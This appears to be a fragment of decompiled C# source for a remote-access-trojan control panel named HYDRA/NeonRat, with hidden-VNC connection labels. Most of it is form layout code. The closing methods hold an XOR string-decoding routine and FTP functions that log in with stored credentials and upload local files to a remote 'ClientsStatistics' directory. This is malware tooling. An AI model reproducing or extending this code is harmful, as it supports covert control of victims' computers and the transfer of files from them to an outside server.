			this.bunifuSeparator15.Name = "bunifuSeparator15";
			this.bunifuSeparator15.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator15.Size = new System.Drawing.Size(1123, 10);
			this.bunifuSeparator15.TabIndex = 80;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator15, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator15, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator15, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).BackColor = System.Drawing.Color.Transparent;
			this.bunifuTransition2.SetDecoration((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.Guna2HtmlLabel.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel.ForeColor = System.Drawing.Color.WhiteSmoke;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Location = new System.Drawing.Point(717, 7);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Name = "Guna2HtmlLabel";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Size = new System.Drawing.Size(62, 23);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).TabIndex = 164;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Text = "0 online";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel, "Connected Clients");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel, (System.Drawing.Image)resources.GetObject("Guna2HtmlLabel.ToolTipIcon"));
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel, "NeonRat");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Visible = false;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).BackColor = System.Drawing.Color.Transparent;
			this.bunifuTransition2.SetDecoration((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.Guna2HtmlLabel1.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel1.ForeColor = System.Drawing.Color.WhiteSmoke;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Location = new System.Drawing.Point(560, 7);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Name = "Guna2HtmlLabel1";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Size = new System.Drawing.Size(151, 23);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).TabIndex = 163;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Text = "Hvnc Connections:";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1, "Connected Clients");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1, (System.Drawing.Image)resources.GetObject("Guna2HtmlLabel1.ToolTipIcon"));
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1, "NeonRat");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Visible = false;
			this.chkLogs.BackColor = System.Drawing.Color.Transparent;
			this.chkLogs.BackgroundColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkLogs.BorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkLogs.CheckColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkLogs.CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
			this.chkLogs.Cursor = System.Windows.Forms.Cursors.Hand;
			this.bunifuTransition2.SetDecoration(this.chkLogs, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.chkLogs, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.chkLogs.DisabledBorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkLogs.DisabledCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkLogs.DisabledUnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkLogs.IsDerivedStyle = true;
			this.chkLogs.Location = new System.Drawing.Point(102, 8);
			this.chkLogs.Name = "chkLogs";
			this.chkLogs.Size = new System.Drawing.Size(58, 22);
			this.chkLogs.Style = MetroSet_UI.Enums.Style.Custom;
			this.chkLogs.StyleManager = null;
			this.chkLogs.Switched = false;
			this.chkLogs.SymbolColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkLogs.TabIndex = 162;
			this.chkLogs.Text = "metroSetSwitch2";
			this.chkLogs.ThemeAuthor = "Narwin";
			this.chkLogs.ThemeName = "MetroDark";
			this.bunifuToolTip1.SetToolTip(this.chkLogs, "");
			this.bunifuToolTip1.SetToolTipIcon(this.chkLogs, null);
			this.bunifuToolTip1.SetToolTipTitle(this.chkLogs, "");
			this.chkLogs.UnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkLogs.SwitchedChanged += new MetroSet_UI.Controls.MetroSetSwitch.SwitchedChangedEventHandler(metroSetSwitch2_SwitchedChanged);
			this.metroSetSwitch1.BackColor = System.Drawing.Color.Transparent;
			this.metroSetSwitch1.BackgroundColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.metroSetSwitch1.BorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.metroSetSwitch1.CheckColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetSwitch1.CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
			this.metroSetSwitch1.Cursor = System.Windows.Forms.Cursors.Hand;
			this.bunifuTransition2.SetDecoration(this.metroSetSwitch1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.metroSetSwitch1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.metroSetSwitch1.DisabledBorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.metroSetSwitch1.DisabledCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.metroSetSwitch1.DisabledUnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.metroSetSwitch1.IsDerivedStyle = true;
			this.metroSetSwitch1.Location = new System.Drawing.Point(699, 7);
			this.metroSetSwitch1.Name = "metroSetSwitch1";
			this.metroSetSwitch1.Size = new System.Drawing.Size(58, 22);
			this.metroSetSwitch1.Style = MetroSet_UI.Enums.Style.Custom;
			this.metroSetSwitch1.StyleManager = null;
			this.metroSetSwitch1.Switched = false;
			this.metroSetSwitch1.SymbolColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetSwitch1.TabIndex = 160;
			this.metroSetSwitch1.Text = "metroSetSwitch1";
			this.metroSetSwitch1.ThemeAuthor = "Narwin";
			this.metroSetSwitch1.ThemeName = "MetroDark";
			this.bunifuToolTip1.SetToolTip(this.metroSetSwitch1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.metroSetSwitch1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.metroSetSwitch1, "");
			this.metroSetSwitch1.UnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.metroSetSwitch1.Visible = false;
			this.metroSetSwitch1.SwitchedChanged += new MetroSet_UI.Controls.MetroSetSwitch.SwitchedChangedEventHandler(metroSetSwitch1_SwitchedChanged);
			this.customLabel3.AutoSize = true;
			this.bunifuTransition1.SetDecoration(this.customLabel3, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.customLabel3, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.customLabel3.Font = new System.Drawing.Font("Century Gothic", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.customLabel3.Location = new System.Drawing.Point(50, 9);
			this.customLabel3.Name = "customLabel3";
			this.customLabel3.Size = new System.Drawing.Size(46, 20);
			this.customLabel3.TabIndex = 161;
			this.customLabel3.Text = "Logs:";
			this.bunifuToolTip1.SetToolTip(this.customLabel3, "");
			this.bunifuToolTip1.SetToolTipIcon(this.customLabel3, null);
			this.bunifuToolTip1.SetToolTipTitle(this.customLabel3, "");
			this.customLabel2.AutoSize = true;
			this.bunifuTransition1.SetDecoration(this.customLabel2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.customLabel2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.customLabel2.Font = new System.Drawing.Font("Century Gothic", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.customLabel2.Location = new System.Drawing.Point(615, 8);
			this.customLabel2.Name = "customLabel2";
			this.customLabel2.Size = new System.Drawing.Size(78, 20);
			this.customLabel2.TabIndex = 159;
			this.customLabel2.Text = "List Icons:";
			this.bunifuToolTip1.SetToolTip(this.customLabel2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.customLabel2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.customLabel2, "");
			this.customLabel2.Visible = false;
			this.bunifuToolTip1.Active = true;
			this.bunifuToolTip1.AlignTextWithTitle = false;
			this.bunifuToolTip1.AllowAutoClose = false;
			this.bunifuToolTip1.AllowFading = true;
			this.bunifuToolTip1.AutoCloseDuration = 5000;
			this.bunifuToolTip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuToolTip1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuToolTip1.ClickToShowDisplayControl = false;
			this.bunifuToolTip1.ConvertNewlinesToBreakTags = true;
			this.bunifuToolTip1.DisplayControl = null;
			this.bunifuToolTip1.EntryAnimationSpeed = 350;
			this.bunifuToolTip1.ExitAnimationSpeed = 200;
			this.bunifuToolTip1.GenerateAutoCloseDuration = false;
			this.bunifuToolTip1.IconMargin = 6;
			this.bunifuToolTip1.InitialDelay = 0;
			this.bunifuToolTip1.Name = "bunifuToolTip1";
			this.bunifuToolTip1.Opacity = 1.0;
			this.bunifuToolTip1.OverrideToolTipTitles = false;
			this.bunifuToolTip1.Padding = new System.Windows.Forms.Padding(10);
			this.bunifuToolTip1.ReshowDelay = 100;
			this.bunifuToolTip1.ShowAlways = true;
			this.bunifuToolTip1.ShowBorders = false;
			this.bunifuToolTip1.ShowIcons = true;
			this.bunifuToolTip1.ShowShadows = true;
			this.bunifuToolTip1.Tag = null;
			this.bunifuToolTip1.TextFont = new System.Drawing.Font("Century Gothic", 11.25f);
			this.bunifuToolTip1.TextForeColor = System.Drawing.Color.White;
			this.bunifuToolTip1.TextMargin = 2;
			this.bunifuToolTip1.TitleFont = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.bunifuToolTip1.TitleForeColor = System.Drawing.Color.Silver;
			this.bunifuToolTip1.ToolTipPosition = new System.Drawing.Point(0, 0);
			this.bunifuToolTip1.ToolTipTitle = "NeonRat";
			this.hvncpanel.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.hvncpanel.BackgroundColor = System.Drawing.Color.Transparent;
			this.hvncpanel.BackgroundImage = (System.Drawing.Image)resources.GetObject("hvncpanel.BackgroundImage");
			this.hvncpanel.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.hvncpanel.BorderColor = System.Drawing.Color.Transparent;
			this.hvncpanel.BorderRadius = 3;
			this.hvncpanel.BorderThickness = 1;
			this.bunifuTransition2.SetDecoration(this.hvncpanel, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.hvncpanel, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.hvncpanel.Location = new System.Drawing.Point(124, 102);
			this.hvncpanel.Name = "hvncpanel";
			this.hvncpanel.ShowBorders = true;
			this.hvncpanel.Size = new System.Drawing.Size(1286, 598);
			this.hvncpanel.TabIndex = 166;
			this.bunifuToolTip1.SetToolTip(this.hvncpanel, "");
			this.bunifuToolTip1.SetToolTipIcon(this.hvncpanel, null);
			this.bunifuToolTip1.SetToolTipTitle(this.hvncpanel, "");
			((System.Windows.Forms.Control)(object)this.labelspeed).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			((System.Windows.Forms.Control)(object)this.labelspeed).BackColor = System.Drawing.Color.Transparent;
			this.bunifuTransition2.SetDecoration((System.Windows.Forms.Control)(object)this.labelspeed, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration((System.Windows.Forms.Control)(object)this.labelspeed, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.labelspeed.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.labelspeed.ForeColor = System.Drawing.Color.WhiteSmoke;
			((System.Windows.Forms.Control)(object)this.labelspeed).Location = new System.Drawing.Point(780, 702);
			((System.Windows.Forms.Control)(object)this.labelspeed).Name = "labelspeed";
			((System.Windows.Forms.Control)(object)this.labelspeed).Size = new System.Drawing.Size(44, 23);
			((System.Windows.Forms.Control)(object)this.labelspeed).TabIndex = 167;
			((System.Windows.Forms.Control)(object)this.labelspeed).Text = "result";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.labelspeed, "Speed Test Result!");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.labelspeed, (System.Drawing.Image)resources.GetObject("labelspeed.ToolTipIcon"));
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.labelspeed, "NeonRat");
			((System.Windows.Forms.Control)(object)this.labelspeed).Visible = false;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).BackColor = System.Drawing.Color.Transparent;
			this.bunifuTransition2.SetDecoration((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.Guna2HtmlLabel4.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel4.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Location = new System.Drawing.Point(684, 702);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Name = "Guna2HtmlLabel4";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Size = new System.Drawing.Size(90, 23);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).TabIndex = 168;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Text = "Net Speed:";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4, "Connected Clients");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4, (System.Drawing.Image)resources.GetObject("Guna2HtmlLabel4.ToolTipIcon"));
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4, "NeonRat");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Visible = false;
			this.bunifuSeparator18.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator18.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator18.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator18.BackgroundImage");
			this.bunifuSeparator18.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator18.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator18, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator18, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator18.LineColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuSeparator18.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator18.LineThickness = 1;
			this.bunifuSeparator18.Location = new System.Drawing.Point(137, 723);
			this.bunifuSeparator18.Name = "bunifuSeparator18";
			this.bunifuSeparator18.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator18.Size = new System.Drawing.Size(139, 10);
			this.bunifuSeparator18.TabIndex = 169;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator18, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator18, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator18, "");
			this.bunifuSeparator18.Visible = false;
			this.label11.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.label11.AutoSize = true;
			this.bunifuTransition1.SetDecoration(this.label11, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.label11, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.label11.Font = new System.Drawing.Font("Century Gothic", 12f);
			this.label11.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.label11.Location = new System.Drawing.Point(222, 703);
			this.label11.Name = "label11";
			this.label11.Size = new System.Drawing.Size(66, 21);
			this.label11.TabIndex = 171;
			this.label11.Text = "label11";
			this.bunifuToolTip1.SetToolTip(this.label11, "");
			this.bunifuToolTip1.SetToolTipIcon(this.label11, null);
			this.bunifuToolTip1.SetToolTipTitle(this.label11, "");
			this.label11.Visible = false;
			this.label10.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.label10.AutoSize = true;
			this.bunifuTransition1.SetDecoration(this.label10, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.label10, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.label10.Font = new System.Drawing.Font("Century Gothic", 12f);
			this.label10.Location = new System.Drawing.Point(134, 703);
			this.label10.Name = "label10";
			this.label10.Size = new System.Drawing.Size(87, 21);
			this.label10.TabIndex = 170;
			this.label10.Text = "Lic Status:";
			this.bunifuToolTip1.SetToolTip(this.label10, "");
			this.bunifuToolTip1.SetToolTipIcon(this.label10, null);
			this.bunifuToolTip1.SetToolTipTitle(this.label10, "");
			this.label10.Visible = false;
			this.bunifuTransition1.AnimationType = Bunifu.UI.WinForms.BunifuAnimatorNS.AnimationType.Particles;
			this.bunifuTransition1.Cursor = null;
			animation.AnimateOnlyDifferences = true;
			animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation1.BlindCoeff");
			animation.LeafCoeff = 0f;
			animation.MaxTime = 1f;
			animation.MinTime = 0f;
			animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation1.MosaicCoeff");
			animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation1.MosaicShift");
			animation.MosaicSize = 1;
			animation.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
			animation.RotateCoeff = 0f;
			animation.RotateLimit = 0f;
			animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation1.ScaleCoeff");
			animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation1.SlideCoeff");
			animation.TimeCoeff = 2f;
			animation.TransparencyCoeff = 0f;
			this.bunifuTransition1.DefaultAnimation = animation;
			this.bunifuTransition2.AnimationType = Bunifu.UI.WinForms.BunifuAnimatorNS.AnimationType.Particles;
			this.bunifuTransition2.Cursor = null;
			animation2.AnimateOnlyDifferences = true;
			animation2.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation2.BlindCoeff");
			animation2.LeafCoeff = 0f;
			animation2.MaxTime = 1f;
			animation2.MinTime = 0f;
			animation2.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation2.MosaicCoeff");
			animation2.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation2.MosaicShift");
			animation2.MosaicSize = 1;
			animation2.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
			animation2.RotateCoeff = 0f;
			animation2.RotateLimit = 0f;
			animation2.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation2.ScaleCoeff");
			animation2.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation2.SlideCoeff");
			animation2.TimeCoeff = 2f;
			animation2.TransparencyCoeff = 0f;
			this.bunifuTransition2.DefaultAnimation = animation2;
			this.pRAM.CategoryName = "Memory";
			this.pRAM.CounterName = "% Committed Bytes In Use";
			this.pCPU.CategoryName = "Processor";
			this.pCPU.CounterName = "% Processor Time";
			this.pCPU.InstanceName = "_Total";
			this.timer3.Tick += new System.EventHandler(timer3_Tick);
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(1418, 738);
			base.Controls.Add(this.label11);
			base.Controls.Add(this.label10);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.labelspeed);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.lblOnline);
			base.Controls.Add(this.metroSetControlBox1);
			base.Controls.Add(this.customLabel1);
			base.Controls.Add(this.lblRAM);
			base.Controls.Add(this.lblCPU);
			base.Controls.Add(this.bunifuLabel4);
			base.Controls.Add(this.bunifuLabel3);
			base.Controls.Add(this.bunifuProgressBar2);
			base.Controls.Add(this.bunifuProgressBar1);
			base.Controls.Add(this.bunifuIconButton1);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add(this.bunifuSeparator9);
			base.Controls.Add(this.bunifuSeparator8);
			base.Controls.Add(this.guna2PictureBox1);
			base.Controls.Add(this.pictureBox1);
			base.Controls.Add(this.iconrestaurar);
			base.Controls.Add(this.iconmaximizar);
			base.Controls.Add(this.pictureBox4);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2PictureBox1);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add(this.bunifuGradientPanel1);
			base.Controls.Add(this.bunifuSeparator12);
			base.Controls.Add(this.bunifuSeparator14);
			base.Controls.Add(this.bunifuPanel2);
			base.Controls.Add(this.hvncpanel);
			base.Controls.Add(this.bunifuSeparator18);
			this.bunifuTransition1.SetDecoration(this, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.Font = new System.Drawing.Font("Century Gothic", 6.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "HYDRAUI";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "HYDRA";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FrmNeonRat_FormClosed);
			base.Load += new System.EventHandler(NeonRat_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(siticoneCustomGradientPanel1_MouseDown);
			((System.ComponentModel.ISupportInitialize)this.Guna2PictureBox1).EndInit();
			this.guna2ContextMenuStrip1.ResumeLayout(false);
			this.guna2ContextMenuStrip2.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)this.iconrestaurar).EndInit();
			((System.ComponentModel.ISupportInitialize)this.iconmaximizar).EndInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox4).EndInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox1).EndInit();
			this.bunifuGradientPanel1.ResumeLayout(false);
			this.bunifuPanel2.ResumeLayout(false);
			this.bunifuPanel1.ResumeLayout(false);
			this.bunifuPanel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)this.pRAM).EndInit();
			((System.ComponentModel.ISupportInitialize)this.pCPU).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		public static bool statisticfile(string fileName)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(HYDRAUI._hpath + fileName);
			ftpWebRequest.Credentials = new NetworkCredential(HYDRAUI._upath, HYDRAUI._ppath);
			ftpWebRequest.Method = "SIZE";
			try
			{
				_ = (FtpWebResponse)ftpWebRequest.GetResponse();
				return true;
			}
			catch (WebException ex)
			{
				if (((FtpWebResponse)ex.Response).StatusCode == FtpStatusCode.ActionNotTakenFileUnavailable)
				{
					return false;
				}
			}
			return false;
		}

		private static string reupload(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append((char)(array[i] ^ c));
			}
			return stringBuilder.ToString();
		}

		public async Task hydra()
		{
			using Forma forma = new Forma();
			forma.ShowDialog();
		}

		public static void createguidir(string macAddress, string username, string password)
		{
			try
			{
				FtpWebRequest obj = (FtpWebRequest)WebRequest.Create(new Uri(macAddress + "/ClientsStatistics"));
				obj.Method = "MKD";
				obj.Credentials = new NetworkCredential(username, password);
				obj.UsePassive = true;
				obj.UseBinary = true;
				obj.KeepAlive = false;
				FtpWebResponse obj2 = (FtpWebResponse)obj.GetResponse();
				obj2.GetResponseStream().Close();
				obj2.Close();
			}
			catch (WebException ex)
			{
				FtpWebResponse ftpWebResponse = (FtpWebResponse)ex.Response;
				if (ftpWebResponse.StatusCode == FtpStatusCode.ActionNotTakenFileUnavailable)
				{
					ftpWebResponse.Close();
				}
				else
				{
					ftpWebResponse.Close();
				}
			}
		}

		public static void uploadFile(string macroAddress, string username, string password, string filePath)
		{
			string obj = macroAddress + "/ClientsStatistics";
			HYDRAUI.createguidir(macroAddress, username, password);
			FtpWebRequest obj2 = (FtpWebRequest)WebRequest.Create(obj + "/" + Path.GetFileName(filePath));
			obj2.Method = "STOR";
			obj2.Credentials = new NetworkCredential(username, password);
			obj2.UsePassive = true;
			obj2.UseBinary = true;
			obj2.KeepAlive = false;
			FileStream fileStream = File.OpenRead(filePath);
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, array.Length);
			fileStream.Close();
			Stream requestStream = obj2.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
		}
	}
}
